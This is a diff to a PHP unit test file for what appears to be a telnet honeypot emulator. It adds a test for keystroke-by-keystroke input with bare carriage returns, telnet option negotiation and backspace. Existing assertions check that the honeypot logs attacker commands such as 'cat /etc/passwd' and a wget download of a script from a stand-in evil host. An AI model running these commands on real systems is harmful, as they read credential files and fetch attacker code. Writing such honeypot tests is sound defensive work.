@@ -99,7 +99,8 @@ final class ProtocolEngineTest extends TestCase
         };
 
         self::assertStringContainsString('login:', $e->banner($s));
-        self::assertSame('Password: ', $e->feed("root\r\n", $s, $cb));       // username -> password prompt
+        // Interactive: the username is echoed, then the password prompt follows.
+        self::assertStringContainsString('Password:', $e->feed("root\r\n", $s, $cb)); // username -> password prompt
         self::assertStringContainsString('Welcome', $e->feed("hunter2\r\n", $s, $cb)); // accept-all login
 
         self::assertStringContainsString('root', $e->feed("whoami\r\n", $s, $cb));
@@ -117,6 +118,36 @@ final class ProtocolEngineTest extends TestCase
         self::assertContains('hunter2', $log);
         self::assertContains('cat /etc/passwd', $log);
         self::assertContains('wget http://evil.example/x.sh', $log);
+    }
+
+    public function test_telnet_interactive_char_mode_cr_iac_and_backspace(): void
+    {
+        // A real telnet client sends keystrokes one at a time, ends a line with a BARE CR (no LF),
+        // and interleaves IAC negotiation — the exact case the old line-codec shell never handled.
+        $e = $this->emu('telnet');
+        $s = new ProtocolSession(3);
+        $log = [];
+        $cb = function (string $cmd) use (&$log): void {
+            $log[] = $cmd;
+        };
+
+        // Banner negotiates server-side echo so the client hands us each keystroke.
+        self::assertStringContainsString("\xff\xfb\x01", $e->banner($s)); // IAC WILL ECHO
+
+        $e->feed("\xff\xfd\x03", $s, $cb);                     // IAC DO SGA — stripped, not input
+        $e->feed("ro", $s, $cb);
+        $out = $e->feed("ot\r", $s, $cb);                      // bare CR terminates the line
+        self::assertStringContainsString('Password:', $out, 'a bare CR (telnet Enter) must end the line');
+        self::assertContains('root', $log, 'username captured clean — no CR/IAC garbage');
+
+        $e->feed("pw\r", $s, $cb);                             // password + CR -> logged in
+
+        // Command typed with a backspace correction: "whox" <BS> "ami" -> "whoami".
+        $e->feed("whox", $s, $cb);
+        $e->feed("\x7f", $s, $cb);
+        $out = $e->feed("ami\r", $s, $cb);
+        self::assertContains('whoami', $log, 'backspace-corrected command logged cleanly');
+        self::assertStringContainsString('root@web01:~#', $out, 'root prompt uses ~ and #, not a polluted $');
     }
 
     // --- codec framing + bounds + safety ---
